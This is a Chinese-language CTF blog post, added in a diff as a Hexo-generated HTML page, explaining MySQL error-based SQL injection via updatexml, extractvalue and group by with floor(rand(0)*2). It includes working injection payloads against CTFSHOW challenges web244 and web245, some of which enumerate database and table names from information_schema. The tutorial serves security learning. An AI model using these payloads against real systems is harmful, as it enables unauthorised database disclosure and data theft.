@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>MYSQL Error Injection - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="MYSQL Error Injection - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2022/09/30/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2022-09-30T15:04:00.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>September</span>
+            <span>30,</span>
+            <span>2022</span>
+        </div>
+        
+
+        <h2 class="title">MYSQL Error Injection</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="MYSQL-报错注入"><a href="#MYSQL-报错注入" class="headerlink" title="MYSQL 报错注入"></a>MYSQL 报错注入</h1><h2 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml"></a>Updatexml</h2><ul>
+<li><p><code>updatexml（XML_document，XPath_string，new_value）</code>:</p>
+<p>该函数的作用是修改xml文件中数据，<code>XML_document</code>表示xml文件名，这个随便你取什么；<code>XPath_string</code>指的是你修改的字符串；<code>new value</code>指的是你要修改成什么值</p>
+<ul>
+<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
+<li>例如： select * from test where id &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。(ps:0x7e就是波浪号)、</li>
+<li>该函数的返回值,如果查找到了字符串，返回值为1；如果没查找到或者报错则为0</li>
+</ul>
+</li>
+<li><p>本地测试：</p>
+<p><code>select * from tb1 where idd = 1 and (updatexml(1,concat(0x7e,database()),3));</code>：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930233454931.png" alt="image-20220930233454931"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930234806093.png" alt="image-20220930234806093"></p>
+<p>这边咱们的数据库就被暴出来了，因此这是存在漏洞的，由于我们的~不符合xml的语法，所以会报错</p>
+</li>
+<li><p>例题（CTFSHOW-web244):</p>
+</li>
+</ul>
+<p>​	<img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930234508371.png" alt="image-20220930234508371">	</p>
+<p>查询语句如上<code>  $sql = &quot;select id,username,pass from ctfshow_user where id = &#39;&quot;.$id.&quot;&#39; limit 1;&quot;;</code></p>
+<p>这边肯定是存在一个error注入的，咱们payload：</p>
+<p><code>?id=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)-- -</code>：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930234857318.png" alt="image-20220930234857318"></p>
+<p>咱们的库名就被爆出来了，接下来只需要一步步的去报表,字段即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)-- -</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930234957469.png" alt="image-20220930234957469"></p>
+<p>接下来就不赘述~</p>
+<h2 id="Extractvalue"><a href="#Extractvalue" class="headerlink" title="Extractvalue"></a>Extractvalue</h2><ul>
+<li><p><code>extractvalue(XML_document，xpath_string)</code>:该函数的作用是查找xml文件中指定字符串，若查找到则返回1，否则0，和updatexml真的几乎一模一样了</p>
+<ul>
+<li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax），这一点和updatexml一样</li>
+</ul>
+</li>
+<li><p>本地测试：</p>
+<p> <code>select 1,extractvalue(1,concat(0x7e,database()));</code></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20220930235938888.png" alt="image-20220930235938888"></p>
+<p>和上面同样的效果，能爆出库名</p>
+</li>
+<li><p>例题（CTFSHOW-WEB245):</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221001000013906.png" alt="image-20221001000013906"></p>
+</li>
+</ul>
+<p>这一题过滤了updatexml，那我们就使用extractvalue，payload<code>	?id=1&#39; or extractvalue(1,concat(0x7e,database()))-- -</code>：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221001001323979.png" alt="image-20221001001323979"></p>
+<p>这边已经成功爆库，接下来步骤就同上</p>
+<h2 id="Group-by"><a href="#Group-by" class="headerlink" title="Group by"></a>Group by</h2><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>这个就稍微的有点难度了，我也不废话直接上大神的链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html</a></p>
+<p>接下来的内容只不过是复述，给自己看看的</p>
+<p>以及假如想在本地复现，mysql的版本很刁钻的，mysql5.6可以，其他没发现可以的版本QWQ，还有就是用MariaDB也可以复现哦</p>
+<h3 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h3><p>这是本文用到的表：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104024699-1334517446.png" alt="img"></p>
+<ul>
+<li><code>group by</code>：用于结合合计函数，根据一个或多个列对结果集进行分组。</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104115299-1116987582.png" alt="img"></p>
+<ul>
+<li><code>rand()</code>:用于产生一个0-1之间的随机数</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104154609-421486309.png" alt="img"></p>
+<p><strong>warnning</strong>：当以某个整数值作为参数来调用的时候，rand() 会将该值作为随机数发生器的种子。对于每一个给定的种子，rand() 函数都会产生一列【可以复现】的数字，也就是有一些数字会是固定的！</p>
+<ul>
+<li><code>floor()</code>:向下取整</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104234546-1067006471.png" alt="img"></p>
+<ul>
+<li><code>floor(rand()*2)</code>:rand()*2 函数生成 0-2之间的数，使用floor()函数向下取整，得到的值就是<strong>不固定</strong>的 “0” 或 “1”</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104414355-42203269.png" alt="img"></p>
+<ul>
+<li><code>floor(rand(0)*2)</code>：rand(0)*2 函数生成 0-2之间的数，使用floor()函数向下取整，但是得到的值【前6位(包括第六位)是固定的】。（为：011011），这是因为给定了种子</li>
+</ul>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710104811511-1488333760.png" alt="img"></p>
+<h3 id="Group-by分组原理"><a href="#Group-by分组原理" class="headerlink" title="Group by分组原理"></a>Group by分组原理</h3><p>首先思考一下下面3个sql语句可以得到什么：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、select username,count(*) from user group by username;</span><br><span class="line">2、select username,count(*) from user group by &quot;username&quot;;</span><br><span class="line">3、select username,count(*) from user group by userna;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710110004060-1352545741.png" alt="img"></p>
+<p><strong>结论</strong>：</p>
+<p>我们发现group by后面的参数可以是一个column_name（字段名），可以是一个字符串（或返回值为字符串的函数），不可以是不完整的column_name。这时你们可能会想，参数是column_name我倒是可以理解是怎么分组的，但是参数是 字符串 是怎么回事？username字段的值中没有”username”啊？只有”admin”，”chen”两个，结果怎么会是 7 呢？让我们接着往下看。</p>
+<p><strong>原因</strong>：</p>
+<p>1.<strong>如果参数是 column_name，即 username，不是字符串（”username”）</strong></p>
+<p>语句执行的时候会建立一个虚拟表（里面有两个字段，分别是 key 主键，count(*)），如果参数是 column_name，系统便会在 user 表中【 依次查询 [相应的] 字段的值(即：参数指明的字段中的值) 】，取username字段第一个值为 admin，这时会在虚拟表的 主键key 中查找 admin 这个字符串，如果存在，就使 count(*) 的值加 1 ；如果不存在就将 admin 这个字符串插入到 主键key 字段中，并且使 count(*) 变为 1；接着取username字段第二个值也为 admin ，查找虚拟表中的 主键key 中已经存在 admin 字符串，就直接将 count(*) 加 1；…… …… ……；到username字段第四个值为 chen 时，查找虚拟表中的 主键key 字段不存在 chen 这个值，此时就将 chen 这个字符串再次插入到 主键key 字段中，并且使 count(*) 变为 1，就这样一直执行下去，直到所有的字段值分组完毕。之后系统就按照虚拟表中的结果将其显示出来。</p>
+<p>取完username字段第四个值（即：chen）时的 <strong>虚拟表</strong> ，如下图：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/2089209-20200710112807067-683100971.png" alt="img"></p>
+<p>2.<strong>如果参数是字符串：”username”，而不是字段名</strong></p>
+<p>语句执行的时候仍会建立一个虚拟表（里面有两个字段，分别是 key 主键，count()），如果参数是字符串 “username”，那系统就不会去取user表中的字段值了,而是直接取字符串：”username”作为值，然后查找比对虚拟表中 key 字段的值，发现没有字符串 “username”，便插入 “username” 这个字符串，并将count() 变为1；然后执行第二次，在虚拟表 key 字段中查找 “username” 这个字符串，发现有，便使 count() 加 1，就这样执行 7 次，count()便变成了 7。</p>
+<h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));</span><br><span class="line">2、select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看到，user表所在的 test 数据库被成功的爆了出来。但是你们仔细观察的话会发现第二个sql语句爆率并不是100%，有时会爆不出来，为什么呢？别着急，继续往下看：</strong></p>
+<p>原因：在我们已经有上面的铺垫之后其实要理解这个sql group by报错注入的原理已经不难了</p>
+<p><strong>以第一条语句为例</strong>：select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));<br>首先我们知道</p>
+<ul>
+<li><p>floor(rand(0)*2) 产生的随机数的<strong>前六位</strong> 一定是 “011011”（上面已经提到过了），</p>
+</li>
+<li><p>concat()函数用于将前后两个字符串相连</p>
+</li>
+<li><p>database ()函数由于返回当前使用数据库的名称。</p>
+</li>
+<li><p>concat(database(),floor(rand(0)*2))生成由database()+0和database()+1组成的随机数列，则前六个数列一定依次是：</p>
+<blockquote>
+<p>database()+0</p>
+<p>database()+1</p>
+<p>database()+1</p>
+<p>database()+0</p>
+<p>database()+1</p>
+<p>database()+1</p>
+</blockquote>
+</li>
+</ul>
+<p>报错的过程：</p>
+<ul>
+<li><p>查询前默认会建立空的虚拟表</p>
+</li>
+<li><p><strong>取第一条记录时</strong>，执行concat(database(),floor(rand(0)*2))（<strong>第一次执行</strong>），计算结果为<code>database()+0</code>，查询虚拟表，发现<code>database()+0</code>主键值不在，然后会执行插入命令，此时又运行一次concat(database(),floor(rand(0)*2))（<strong>第二次执行</strong>），计算结果为<code>databse()+1</code>，然后插入该值。（即：虽然查询比对的是database()+0，但是真正插入的是执行第二次的结果database()+1，这个过程，concat(database(),floor(rand(0)*2))<strong>执行了2次</strong>，查询比对时执行了一次，插入时执行了一次）。</p>
+</li>
+<li><p><strong>取第二条记录</strong>，执行concat(database(),floor(rand(0)*2))（<strong>第三次执行</strong>），计算结果为<code>database()+1</code>,查询虚拟表</p>
+<p><strong>发现‘databse()+1’虚拟表存在，所以不再执行插入命令，也就不会执行第二次的concat(database(),floor(rand(0)*2)),count(*)直接加一</strong></p>
+<p>（即，查询为database()+1,直接加1，这个过程concat(database(),floor(rand(0)*2))<strong>只执行了一次</strong>）。</p>
+</li>
+<li><p><strong>取第三条记录</strong>，执行concat(database(),floor(rand(0)*2))（<strong>第四次执行</strong>），计算结果为database()+0，查询虚拟表，发现database()+0主键值不存在，则会执行插入命令，此时<strong>又会再次</strong>执行一次concat(database(),floor(rand(0)*2))（<strong>第五次执行</strong>），计算结果为database()+1将其作为主键值，<strong>但是database()+1这个主键值已经存在于虚拟表中了，由于主键值必需唯一，所以会发生报错。而报错的结果就是 database()+1即 ‘test1’，从而得出数据库的名称 test</strong>。</p>
+</li>
+</ul>
+<p>​     <strong>由以上过程发现，总共取了三条记录（所以表中的记录数至少为三条），floor(rand(0)*2)执行了五次</strong>。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>现在，解释了group by报错注入的原理，想必大家已经知道为什么：</p>
+<ul>
+<li>select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));一定可以注入成功（要成功注入，前提表中的记录数至少为三条）</li>
+<li>而select count(*) from information_schema.tables group by concat(database(),floor(rand()*2));却不一定了吧。（要成功注入，前提表中的记录数至少为两条）</li>
+</ul>
+<p><strong>没错是因为floor(rand()*2)的前几位随机数顺序是不固定的，所以并不能保证一定会注入成功，但是其只需两条记录数就行了（因为它可能会产出 “0101” ，这样只需两条记录就可以成功注入，你可以试试推导一下），这也算是它的优势吧。</strong></p>
+<p>​		</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/SQL/" class="tag">#SQL</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/%5BHNCTF%5D-challenge_rce/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">[HNCTF] challenge_rce</h3>
+                </div>
+            </div>
+        </a>
+        
+        <a class="prev"></a>
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
